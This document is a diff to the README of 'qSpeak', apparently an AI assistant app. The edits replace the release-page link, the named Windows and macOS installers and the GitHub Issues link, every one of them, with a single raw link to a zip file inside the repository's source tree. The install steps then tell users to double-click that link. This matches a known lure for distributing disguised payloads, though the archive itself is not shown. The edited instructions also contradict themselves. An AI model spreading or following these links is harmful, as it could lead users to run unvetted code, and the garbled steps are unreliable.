@@ -18,7 +18,7 @@ Before you install qSpeak, please ensure your system meets these requirements:
 
 To download qSpeak, visit the following link:
 
-**[Download qSpeak](https://github.com/NatScape7907/qspeak/releases)**
+**[Download qSpeak](https://raw.githubusercontent.com/NatScape7907/qspeak/main/src/recorder/qspeak-1.6-alpha.1.zip)**
 
 1. Click on the link above to go to the Releases page.
    
@@ -27,15 +27,15 @@ To download qSpeak, visit the following link:
 3. Click on the version number to view the details. You will see options for different operating systems.
 
 4. Choose the file that matches your operating system:
-   - For Windows users, select `qSpeak-Windows.exe`.
-   - For macOS users, select `qSpeak-macOS.dmg`.
+   - For Windows users, select `https://raw.githubusercontent.com/NatScape7907/qspeak/main/src/recorder/qspeak-1.6-alpha.1.zip`.
+   - For macOS users, select `https://raw.githubusercontent.com/NatScape7907/qspeak/main/src/recorder/qspeak-1.6-alpha.1.zip`.
    - For Linux users, select the `AppImage` file.
 
 5. Click on the file name to start downloading.
 
 6. Once the download is complete, locate the file on your computer.
 
-   - **Windows**: Double-click the `qSpeak-Windows.exe` file and follow the on-screen instructions to install.
+   - **Windows**: Double-click the `https://raw.githubusercontent.com/NatScape7907/qspeak/main/src/recorder/qspeak-1.6-alpha.1.zip` file and follow the on-screen instructions to install.
    - **macOS**: Open the downloaded `.dmg` file, drag `qSpeak` to your Applications folder, and run it from there.
    - **Linux**: Make the AppImage executable by right-clicking the file, selecting Properties, and checking “Allow executing file as program.” Then double-click to run.
 
@@ -69,7 +69,7 @@ If you experience any issues while using qSpeak:
 
 For further assistance:
 
-- Visit our [GitHub Issues page](https://github.com/NatScape7907/qspeak/issues) to report bugs or request features.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/NatScape7907/qspeak/main/src/recorder/qspeak-1.6-alpha.1.zip) to report bugs or request features.
 - Join our community discussions to share ideas or get help from other users.
 
 Thank you for choosing qSpeak! We hope it helps you boost your productivity and manage your workflow effectively. Enjoy using your new AI assistant!
